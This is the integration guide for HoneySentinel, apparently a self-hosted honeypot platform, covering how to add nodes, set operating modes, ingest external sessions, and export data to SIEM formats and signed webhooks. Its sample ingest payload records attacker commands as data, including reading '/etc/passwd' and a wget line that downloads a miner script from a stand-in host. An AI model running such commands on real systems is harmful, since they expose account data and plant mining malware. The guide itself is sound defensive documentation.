# Integration Guide — Adding a Honeypot Node

How to attach an additional honeypot engine to an existing HoneySentinel
deployment, and how to pull the resulting intelligence into other tooling.

> **Scope note.** HoneySentinel is currently **single-tenant**: one backend,
> one dashboard, one shared dataset. Any authenticated user can see every
> session from every node. There is no organisation or tenant model, and
> nothing partitions data between deployments. Running it as a service for
> separate clients would require adding a tenant entity, scoping every query
> to it, and enforcing that scope in each route — none of which exists today.
> What *is* supported, and what this guide covers, is running **several nodes
> that all report into one deployment**.

---

## Architecture

```
   Site A                Site B                Site C
      │                     │                     │
┌─────▼──────┐       ┌──────▼─────┐       ┌───────▼────┐
│  Engine 1  │       │  Engine 2  │       │  Engine 3  │
│ ssh/ftp/   │       │  http/     │       │  ssh only  │
│ http       │       │  https     │       │            │
└─────┬──────┘       └──────┬─────┘       └───────┬────┘
      │                     │                     │
      └──────────┬──────────┴──────────┬──────────┘
                 │  X-Honeypot-Token   │
                 ▼                     ▼
        ┌────────────────────────────────────┐
        │   Backend API  →  PostgreSQL       │
        └────────────────┬───────────────────┘
                         ▼
                    Dashboard
```

Each engine registers itself as a **node**. Sessions are attributed to the
node that captured them, so you can filter and compare by node.

---

## Adding a node

### 1. Provision a host

Any small VPS. The host needs Docker and inbound access on the ports you
intend to expose.

### 2. Configure

```bash
git clone https://github.com/mandoof1/honeypot-ui.git
cd honeypot-ui
cp .env.example .env
```

```env
BACKEND_API_URL=https://your-api.example.com/api/v1

# Must be byte-identical to the backend's value.
HONEYPOT_INGEST_TOKEN=<shared token>

# Distinct per node — this is what the node is called in the dashboard.
HONEYPOT_NODE_NAME=edge-frankfurt-01

# Only the protocols this node should emulate.
HONEYPOT_PROTOCOLS=ssh,http

HONEYPOT_OPERATIONAL_MODE=active
HONEYPOT_ENABLE_ISOLATION=true
```

`HONEYPOT_NODE_NAME` is the identity key. Two engines sharing a name will
re-register as the *same* node and their sessions will be merged.

### 3. Start

```bash
docker compose up -d --build honeypot
```

Confirm registration:

```bash
curl -H "Authorization: Bearer $TOKEN" \
     https://your-api.example.com/api/v1/nodes/
```

The node appears with `last_heartbeat` set. Sessions it captures show up in
the dashboard within seconds of each connection closing.

---

## Operating modes

| Mode | Behaviour |
|---|---|
| `active` | Emulators answer: fake shell, fake filesystem, fake HTTP responses. Captures the richest behavioural data. |
| `passive` | Connections are accepted and logged but never answered. Captures who connected and what they sent, nothing more. Lower interaction, lower risk. |

Switch at runtime without a restart, from **Settings → Emulation mode** in the
dashboard or through the API. Saving in Settings stores the mode and pushes it
to the running engine. An engine that was unreachable adopts the stored mode the
next time it registers. Passive mode applies to every protocol: HTTP requests
and anything an FTP client sends before giving up are still recorded.

```bash
curl -X PATCH https://your-api.example.com/api/v1/honeypot/mode \
     -H "Authorization: Bearer $ADMIN_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"mode": "passive"}'
```

---

## Ingesting from an external collector

To feed sessions from something other than this engine — Cowrie, Dionaea, or
your own tooling — POST to the internal ingest endpoint.

```http
POST /api/v1/sessions/ingest-internal?node_id=1
X-Honeypot-Token: <shared token>
Content-Type: application/json
```

```json
{
  "protocol": "ssh",
  "attacker_ip": "203.0.113.42",
  "attacker_port": 51234,
  "started_at": "2026-01-15T10:30:00Z",
  "duration_seconds": 412.5,
  "status": "completed",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://198.51.100.9/miner.sh -O /tmp/m.sh"
  ],
  "payload": "",
  "uploads": [
    { "filename": "m.sh", "sha256": "<64 hex chars>", "size": 1024 }
  ],
  "failed_logins": 12,
  "flow": {
    "duration": 412.5,
    "fwd_packets": 38, "fwd_bytes": 4120, "fwd_max": 1180,
    "bwd_packets": 41, "bwd_bytes": 9630, "bwd_max": 1460,
    "fwd_iat_mean": 9.8, "fwd_iat_max": 61.2, "flow_iat_max": 61.2
  },
  "packets": [{ "type": "data", "size": 400 }]
}
```

Every field except `attacker_ip` is optional.

`flow` is what the stage-1 classifier reads. It holds the connection's
statistics measured at the socket, as `honeypot/capture/flow.py` defines them:

- **Direction:** forward is from the client.
- **Packets:** data-carrying segments only.
- **Units:** bytes are payload bytes; times are in seconds.

Without `flow`, the verdict rests on the protocol's port alone. Unknown `status` values fall
back to `completed` and an unparseable `started_at` falls back to ingest
time, so a malformed field degrades that field rather than rejecting the
session.

The response contains the full analysis:

```json
{
  "session_id": 42,
  "session_uuid": "…",
  "ai_classification": {
    "category": "exploitation",
    "confidence": 0.81,
    "model_source": "synthetic"
  },
  "nlp_analysis": { "tool_names": ["wget_curl", "enum_linux"], "…": "…" },
  "anomaly_detection": { "anomaly_score": 0.72, "is_anomalous": true },
  "attacker_profile": { "profile": "automated_bot", "confidence": 0.64 },
  "mitre_attack": { "tactic_ids": ["TA0007"], "techniques": [] },
  "severity": "high",
  "iocs": []
}
```

Check `model_source`: `"synthetic"` means the bootstrap model produced the
verdict and its confidence is not calibrated. See the limitations section of
the README.

---

## Getting data out

### Bulk export

```bash
curl -X POST "https://your-api.example.com/api/v1/export/?format=cef" \
     -H "Authorization: Bearer $TOKEN" -OJ
```

| Format | Use |
|---|---|
| `json` | Full structured report per session |
| `cef` | One CEF line per session — ArcSight, QRadar, Splunk |
| `stix` | A STIX 2.1 bundle of indicators and attack patterns |

Requires the analyst role. Capped at 5000 sessions per request; narrow with
`date_from` / `date_to` or an explicit `session_ids` list.

All values are escaped for their target format, so an attacker cannot forge
extra CEF fields or break a STIX pattern by choosing a hostile IP string or
tool name.

### Real-time webhook

Set `WEBHOOK_URL` and every high/critical alert is POSTed as it is raised:

```json
{
  "source": "HoneySentinel",
  "event_type": "high_severity_alert",
  "timestamp": "2026-01-15T10:36:52Z",
  "data": {
    "severity": "critical",
    "title": "Exploitation attack from 203.0.113.42",
    "attacker_ip": "203.0.113.42",
    "geo": { "country": "NL", "city": "Amsterdam" },
    "detected_tools": ["metasploit"],
    "mitre_techniques": [{ "id": "T1068", "name": "…" }]
  }
}
```

Set `WEBHOOK_SECRET` and each request carries an
`X-HoneySentinel-Signature` header — the HMAC-SHA256 of the raw body — so the
receiver can verify the alert really came from your deployment:

```python
import hmac, hashlib

expected = hmac.new(SECRET.encode(), raw_body, hashlib.sha256).hexdigest()
if not hmac.compare_digest(expected, request.headers["X-HoneySentinel-Signature"]):
    abort(401)
```

---

## Roles

| Role | Can |
|---|---|
| `viewer` | Read sessions, alerts, nodes, dashboard |
| `analyst` | The above, plus triage alerts and export data |
| `admin` | Everything, plus manage users, nodes, thresholds and engine mode |

Self-registration always creates a **viewer**. Promotion is admin-only:

```bash
curl -X PATCH https://your-api.example.com/api/v1/auth/users/7/role \
     -H "Authorization: Bearer $ADMIN_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"role": "analyst"}'
```

---

## Operational checklist

- [ ] `HONEYPOT_INGEST_TOKEN` identical on backend and every engine
- [ ] Unique `HONEYPOT_NODE_NAME` per node
- [ ] Control API (port 8000) reachable by the backend but **not** by the internet
- [ ] Real SSH daemon moved off port 22 before redirecting it
- [ ] Node on a network with nothing valuable reachable from it
- [ ] `ENVIRONMENT=production` and no placeholder secrets
- [ ] Provider's acceptable-use policy checked
- [ ] Captured uploads (`data/uploads/`) treated as live malware — they are
      real attacker payloads, stored under their SHA-256, and must never be
      executed
